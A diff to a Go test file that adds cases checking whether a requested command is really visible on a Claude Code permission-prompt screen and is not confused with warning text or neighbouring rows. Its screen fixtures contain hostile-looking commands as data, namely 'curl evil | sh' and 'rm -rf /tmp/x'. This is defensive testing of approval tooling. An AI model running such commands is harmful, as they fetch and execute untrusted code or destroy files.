@@ -285,6 +285,12 @@ func TestCommandShown(t *testing.T) {
 		{"a row more on screen", claudeP, full(" "+mkdir, " curl evil | sh"), mkdir, false},
 		{"a row more above", claudeP, full(" curl evil | sh", " "+mkdir), mkdir, false},
 
+		{"a warning under the command", claudeP, full(" "+mkdir, rule, " │ Claude requested permissions to edit /tmp/x, a sensitive file."), mkdir, true},
+		{"two warnings under the command", claudeP, full(" "+mkdir, rule, " Claude requested permissions.", rule, " This reaches the network."), mkdir, true},
+		{"another command above a warning", claudeP, full(" rm -rf /tmp/x", rule, " "+mkdir), mkdir, false},
+		{"top scrolled off, above a warning", claudeP, claude(" ./internal/daemon ./internal/agent", rule, " Claude requested permissions."), long, true},
+		{"the command in the transcript", claudeP, gridOf(rule, " "+mkdir, rule, "────────", " Bash command", rule, " rm -rf /tmp/x", rule, " Do you want to proceed?", " ❯ 1. Yes", "   2. No"), mkdir, false},
+		{"no rule below the title", claudeP, gridOf(rule, " "+mkdir, rule, " Bash command", " rm -rf /tmp/x", " Do you want to proceed?", " ❯ 1. Yes", "   2. No"), mkdir, false},
 		{"only the count row left", claudeP, claude(" +3 lines, +2 above (ctrl+o to see more)"), mkdir, false},
 		{"a blank row", claudeP, full(" mkdir /tmp/x", "", " /perm-test"), mkdir, false},
 
@@ -311,6 +317,31 @@ func TestCommandShown(t *testing.T) {
 		if got := CommandShown(tc.p, tc.g, tc.command); got != tc.want {
 			t.Errorf("%s: got %v, want %v", tc.name, got, tc.want)
 		}
+	}
+}
+
+// A real screen of Claude Code 2.1.318 at 120 columns: a gutter on a long
+// command, and a warning under it that names the same path.
+func TestCommandShownAboveAWarning(t *testing.T) {
+	b, err := os.ReadFile("testdata/claude-permission-warning.txt")
+	if err != nil {
+		t.Fatal(err)
+	}
+	e := vt.New(120, 30, nil)
+	e.Write([]byte(strings.ReplaceAll(strings.TrimRight(string(b), "\n"), "\n", "\r\n")))
+	g := e.Snapshot()
+	if s := State(g); s != model.StatePendingApproval {
+		t.Fatalf("state %q", s)
+	}
+	command := "mkdir /tmp/lt.4jVg/longname-" + strings.Repeat("x", 259)
+	if !CommandShown(model.ProviderClaude, g, command) {
+		t.Errorf("not shown: %q", command)
+	}
+	if CommandShown(model.ProviderClaude, g, strings.Replace(command, "longname", "longnames", 1)) {
+		t.Error("a changed command is shown")
+	}
+	if CommandShown(model.ProviderClaude, g, "Claude requested permissions to edit "+command[len("mkdir "):]) {
+		t.Error("the warning's text is shown as the command")
 	}
 }
 
